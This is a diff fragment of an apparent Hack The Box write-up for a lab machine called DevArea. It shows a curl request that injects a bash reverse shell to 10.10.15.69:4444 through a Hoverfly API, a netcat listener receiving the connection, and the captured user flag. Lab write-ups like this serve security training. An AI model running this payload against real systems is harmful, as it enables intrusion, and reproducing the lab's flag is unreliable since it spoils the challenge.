@@ -208,8 +208,13 @@ ajdev@rootbox:~/HTB/DevArea$ curl -s -X PUT http://devarea.htb:8888/api/v2/hover
 -H "Content-Type: application/json" \
 -d '{"binary":"bash","script":"bash -i >& /dev/tcp/10.10.15.69/4444 0>&1"}'
 
-listen i
+listen in port 4444:
 
+ajdev@rootbox:~$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 10.129.21.35 39838
+bash: cannot set terminal process group (1456): Inappropriate ioctl for device
+bash: no job control in this shell
 dev_ryan@devarea:/opt/HoverFly$ cd /home
 cd /home
 dev_ryan@devarea:/home$ ls -la
@@ -227,5 +232,6 @@ user.txt
 dev_ryan@devarea:~$ cat user.txt
 cat user.txt
 b26907b13d0b9feb29192f3178938a05
-dev_ryan@devarea:~$
 ```
+
+
